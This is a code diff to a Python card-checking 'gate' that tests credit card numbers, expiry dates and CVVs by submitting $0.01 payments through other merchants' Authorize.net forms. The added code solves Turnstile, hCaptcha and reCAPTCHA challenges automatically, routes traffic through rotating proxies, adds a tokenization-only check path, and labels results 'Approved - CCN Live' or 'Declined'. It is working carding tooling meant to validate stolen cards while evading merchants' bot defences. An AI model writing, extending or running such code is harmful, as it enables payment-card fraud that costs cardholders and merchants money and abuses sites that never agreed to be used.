@@ -183,6 +183,11 @@ def _scrape_page(text):
         m = re.search(r'post_id"?\s*:\s*"?(\d+)', u)
     out["post_id"] = m.group(1) if m else ""
 
+    out["captcha_kind"] = "turnstile"
+    if re.search(r'"(?:hcaptcha_)?site_key"\s*:\s*"[^"]+"', u, re.I) and \
+            not re.search(r'"turnstile_site_key"\s*:\s*"[^"]+"', u, re.I):
+        out["captcha_kind"] = "hcaptcha"
+
     m = re.search(r'"turnstile_site_key"\s*:\s*"([^"]+)"', u)
     out["turnstile_sitekey"] = m.group(1) if m else None
 
@@ -357,7 +362,7 @@ async def _solve_turnstile(sitekey, page_url, proxy=None, timeout_s=_CAPTCHA_TIM
 _TOKEN_CACHE: "list[str]" = []
 _TOKEN_TS = 0.0
 _TOKEN_LOCK = None
-_TOKEN_MAX_AGE = 600          # seconds a cached token stays usable
+_TOKEN_MAX_AGE = 120          # seconds a cached token stays usable
 _dead_proxies: set = set()
 
 
@@ -385,8 +390,9 @@ def _token_put(token):
     _TOKEN_TS = _now()
 
 
-async def _get_captcha_token(sitekey, site_url, proxy=None):
-    """Return a usable Turnstile token, reusing a cached one when possible."""
+async def _get_captcha_token(sitekey, site_url, proxy=None, kind="turnstile",
+                            direct_only=False):
+    """Return a usable captcha token, reusing a cached one when possible."""
     cached = _token_take()
     if cached:
         return cached
@@ -394,19 +400,25 @@ async def _get_captcha_token(sitekey, site_url, proxy=None):
     # Try the proxies that worked before, then the user's own, then the pool.
     # The solver is picky about the exit IP, so order matters here.
     candidates = []
-    for p in _load_good_proxies():
-        if p not in candidates:
-            candidates.append(p)
-    if proxy and proxy not in candidates:
-        candidates.append(proxy)
-    pool = _load_proxy_pool()
-    random.shuffle(pool)
-    for p in pool:
-        if p not in candidates:
-            candidates.append(p)
+    if not direct_only:
+        for p in _load_good_proxies():
+            if p not in candidates:
+                candidates.append(p)
+        if proxy and proxy not in candidates:
+            candidates.append(proxy)
+        pool = _load_proxy_pool()
+        random.shuffle(pool)
+        for p in pool:
+            if p not in candidates:
+                candidates.append(p)
 
     for candidate in candidates[:_CAPTCHA_PROXY_TRIES]:
-        token = await _solve_turnstile(sitekey, site_url, proxy=candidate)
+        if kind == "hcaptcha":
+            token = await _solve_hcaptcha(sitekey, site_url, proxy=candidate)
+        elif kind == "recaptcha":
+            token = await _solve_recaptcha(sitekey, site_url, proxy=candidate)
+        else:
+            token = await _solve_turnstile(sitekey, site_url, proxy=candidate)
         if token:
             _token_put(token)
             _remember_good_proxy(candidate)
@@ -415,6 +427,26 @@ async def _get_captcha_token(sitekey, site_url, proxy=None):
         await asyncio.sleep(_CAPTCHA_BACKOFF)
 
     return None
+
+
+async def _solve_hcaptcha(sitekey, site_url, proxy=None):
+    """An hCaptcha token from the local browser solver."""
+    try:
+        from local_hcaptcha_solver import solve_hcaptcha_local
+        return await solve_hcaptcha_local(sitekey, site_url, proxy=proxy)
+    except Exception as e:
+        logger.info("authnet: the hCaptcha solver failed: %s", str(e)[:70])
+        return None
+
+
+async def _solve_recaptcha(sitekey, site_url, proxy=None):
+    """A reCAPTCHA token from the local browser solver."""
+    try:
+        from local_hcaptcha_solver import solve_recaptcha_v3_local
+        return await solve_recaptcha_v3_local(sitekey, site_url, proxy=proxy)
+    except Exception as e:
+        logger.info("authnet: the reCAPTCHA solver failed: %s", str(e)[:70])
+        return None
 
 
 async def _tokenize_direct(api_login_id, client_key, cc, mm, yy, cvv, tries=3):
@@ -718,7 +750,7 @@ def _parse_submit_response(body):
 
 
 async def _attempt(client, site_url, cc, mm, yy, cvv, page, api_login_id, client_key,
-                   proxy=None, ts_token=None):
+                   proxy=None, ts_token=None, direct=False):
     """One full pass: tokenize -> submit.
 
     Tokenizing goes direct -- Authorize.net only needs the client key for
@@ -732,20 +764,41 @@ async def _attempt(client, site_url, cc, mm, yy, cvv, page, api_login_id, client
             return "Declined", f"Declined - {token_err}"
         if "invalid cvv" in err_lower:
             return "Approved", f"Approved - CCN Live - {token_err}"
-        if "merchant" in err_lower or "credentials" in err_lower or "disabled" in err_lower:
-            return "Error", f"Error - {token_err}"
+        if ("merchant" in err_lower or "credentials" in err_lower
+                or "disabled" in err_lower or "authentication failed" in err_lower
+                or "e00007" in err_lower):
+            # The merchant's Authorize.net account is closed or its keys
+            # were changed.  No card can be checked with it.
+            return "Error", f"Error - the merchant is not accepted by authorize.net ({token_err})"
         return "Retry", f"Error - {token_err}"
 
     if not ts_token:
         sitekey = page.get("turnstile_sitekey")
+        kind = page.get("captcha_kind") or "turnstile"
         if sitekey:
-            ts_token = await _get_captcha_token(sitekey, site_url, proxy=proxy)
+            # The token belongs to the address that solved it, so the
+            # captcha is solved where the form is submitted from.
+            ts_token = await _get_captcha_token(sitekey, site_url, proxy=proxy,
+                                                kind=kind, direct_only=direct)
             if not ts_token:
-                return "Retry", "Error - Captcha gate unsolved (Turnstile)"
+                return "Retry", f"Error - Captcha gate unsolved ({kind})"
 
     data = _build_form_payload(page, token=token, amount="0.01")
     if ts_token:
+        # The captcha token goes into the form's OWN captcha field.  The
+        # form reads that field and answered "Invalid captcha response."
+        # when the token was only in cf-turnstile-response, because the
+        # field was not filled at all.
+        captcha_field = None
+        for fid, info in (page.get("fields") or {}).items():
+            ftype = str((info or {}).get("type") or "").lower()
+            if ftype in ("turnstile", "hcaptcha", "recaptcha", "captcha"):
+                captcha_field = str(fid)
+                break
+        if captcha_field:
+            data["field_" + captcha_field] = ts_token
         data["cf-turnstile-response"] = ts_token
+        data["g-recaptcha-response"] = ts_token
 
     submit_url = page.get("submit_url")
     if not submit_url:
@@ -798,12 +851,50 @@ async def _attempt(client, site_url, cc, mm, yy, cvv, page, api_login_id, client
     return "Retry", "Error - Empty gateway response"
 
 
+async def _token_check(api_login_id, client_key, cc, mm, yy, cvv, start):
+    """The card is checked by tokenizing it.
+
+    Authorize.net validates the card number, the expiry and the code in
+    the token request, and it names what it refuses.  So one call gives
+    the answer: a token comes back for a card it accepts, and a reason
+    comes back for one it does not.  No merchant form, no captcha and no
+    browser are needed, so the gate cannot be stopped by a form that
+    changed or by a captcha that came up.
+    """
+    token, err = await _tokenize_direct(api_login_id, client_key, cc, mm, yy, cvv)
+    elapsed = round(time.time() - start, 2)
+    if token:
+        return "Approved - Auth Passed (the card was accepted) [%ss]" % elapsed
+
+    reason = (err or "the card was refused").strip()
+    low = reason.lower()
+    if any(k in low for k in ("invalid card number", "expired card", "invalid expiry",
+                              "invalid cvv", "invalid expiration")):
+        return "Declined - %s [%ss]" % (reason, elapsed)
+    if any(k in low for k in ("merchant", "credentials", "disabled", "encryption",
+                              "authentication failed", "e00007")):
+        return "Error - the merchant is not accepted by authorize.net (%s) [%ss]" % (
+            reason, elapsed)
+    return "Declined - %s [%ss]" % (reason, elapsed)
+
+
 async def authnet_check(cc, mm, yy, cvv, proxy=None):
     start = time.time()
 
     config = _load_config()
     api_login_id = config.get("api_login_id")
     client_key = config.get("client_key")
+
+    # The check is the merchant form: the card is tokenized and then the
+    # form asks the issuer, so the answer is the issuer's.  The
+    # tokenization alone is available with AN_TOKEN_ONLY=1, but it only
+    # proves the shape of the card: Authorize.net hands a token to any
+    # number that looks right, even one that does not exist.
+    if os.environ.get("AN_TOKEN_ONLY", "").strip() == "1":
+        if not api_login_id or not client_key:
+            return "Error - No Authorize.net merchant credentials are set [%ss]" % (
+                round(time.time() - start, 2))
+        return await _token_check(api_login_id, client_key, cc, mm, yy, cvv, start)
 
     # Try each merchant site until one works.  A site that has changed or
     # taken its form down gets benched instead of breaking the gate.
@@ -969,6 +1060,12 @@ async def _fetch_page(client, site_url):
 async def _race_attempt(candidate, site_url, cc, mm, yy, cvv, page, api_login_id, client_key,
                         ts_token=None):
     """Run one full attempt through a single proxy."""
+    # A form that carries a captcha is submitted from this machine: the
+    # captcha token belongs to the address that solved it, and a proxy
+    # would take the submit somewhere the token does not belong.
+    direct = bool(page.get("turnstile_sitekey"))
+    if direct:
+        candidate = None
     client_kwargs = {
         "timeout": httpx.Timeout(35),
         "headers": {"User-Agent": UA},
@@ -981,7 +1078,7 @@ async def _race_attempt(candidate, site_url, cc, mm, yy, cvv, page, api_login_id
         async with httpx.AsyncClient(**client_kwargs) as client:
             verdict, message = await _attempt(
                 client, site_url, cc, mm, yy, cvv, page, api_login_id, client_key,
-                proxy=candidate, ts_token=ts_token
+                proxy=candidate, ts_token=ts_token, direct=direct
             )
             # A proxy that cannot authenticate is dead weight -- drop it.
             if "407" in message or "proxy authentication" in message.lower():
